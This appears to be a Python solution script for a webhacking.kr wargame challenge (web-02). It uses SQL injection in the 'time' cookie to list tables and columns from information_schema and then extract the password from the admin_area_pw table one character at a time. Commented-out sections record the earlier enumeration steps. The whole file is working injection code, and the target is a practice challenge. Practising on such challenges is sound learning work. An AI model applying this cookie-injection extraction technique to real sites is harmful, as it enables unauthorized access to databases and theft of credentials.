import requests
from bs4 import BeautifulSoup

url = 'https://webhacking.kr/challenge/web-02/'

# cookie = {'time': '(select length(table_name) from information_schema.tables where table_schema = database() limit 1,2)'}
# r = requests.get(url, cookies=cookie)

# list1 = []
# for i in range(1,14):
#     cookie['time'] = f"(select ascii(substring(table_name, {str(i)}, 1)) from information_schema.tables where table_schema = database() limit 1)"
#     response = requests.get(url, cookies=cookie)
#     # print(response.text)
#     # print(response.text[19:21])
#     # print(response.text[22:24])
#     sec = int(response.text[19:21])*60 + int(response.text[22:24])
#     print(sec)
#     list1.append(sec)

# for i in list1:
#     print(chr(i), end='')

first_db = 'admin_area_pw'
secend_db = 'log'

# cookie = {'time' : "(select count(column_name) from information_schema.columns where table_name = 'admin_area_pw')"}
# response = requests.get(url, cookies=cookie)
# print(response.text)

# cookie = {'time' : "(select length(column_name) from information_schema.columns where table_name = 'admin_area_pw' limit 1)"}
# response = requests.get(url, cookies=cookie)
# print(response.text)

# for i in range(1,3):
#     cookie['time'] = f"(select ascii(substring(column_name, {str(i)}, 1)) from information_schema.columns where table_name = 'admin_area_pw' limit 1)"
#     response = requests.get(url, cookies=cookie)
#     # print(response.text)
#     # print(response.text[19:21])
#     # print(response.text[22:24])
#     sec = int(response.text[19:21])*60 + int(response.text[22:24])
#     print(chr(sec), end='')
#     # list1.append(sec)

first_db_column = 'pw'

cookie = {'time' : "(select length(pw) from admin_area_pw)"}
r = requests.get(url, cookies=cookie)
print(r.text)

for i in range(1,18):
    cookie['time'] = f"(select ascii(substring(pw, {str(i)}, 1)) from admin_area_pw)"
    response = requests.get(url, cookies=cookie)
    sec = int(response.text[19:21])*60 + int(response.text[22:24])
    print(chr(sec), end='')